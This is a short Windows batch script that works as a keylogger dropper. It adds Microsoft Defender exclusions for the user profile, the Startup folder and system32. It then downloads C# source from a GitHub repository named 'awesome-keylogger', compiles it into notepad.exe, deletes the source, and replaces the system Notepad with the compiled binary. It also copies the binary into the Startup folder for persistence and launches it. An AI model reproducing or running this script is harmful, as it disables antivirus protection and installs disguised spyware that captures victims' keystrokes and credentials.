@echo off
powershell Add-MpPreference -ExclusionPath %userprofile%
powershell Add-MpPreference -ExclusionPath %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell Add-MpPreference -ExclusionPath c:\windows\system32\
doskey INITIALIZE=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
cd %userprofile%
curl -O https://raw.githubusercontent.com/dGgzajNzdDNy/awesome-keylogger/refs/heads/main/WinBoot.cs
c:\windows\microsoft.net\framework\v4.0.30319\csc.exe /target:winexe /out:notepad.exe WinBoot.cs
erase WinBoot.cs
ren c:\windows\system32\notepad.exe notepad.exe.sync
copy notepad.exe c:\windows\system32\notepad.exe
copy notepad.exe INITIALIZE
%userprofile%\notepad.exe
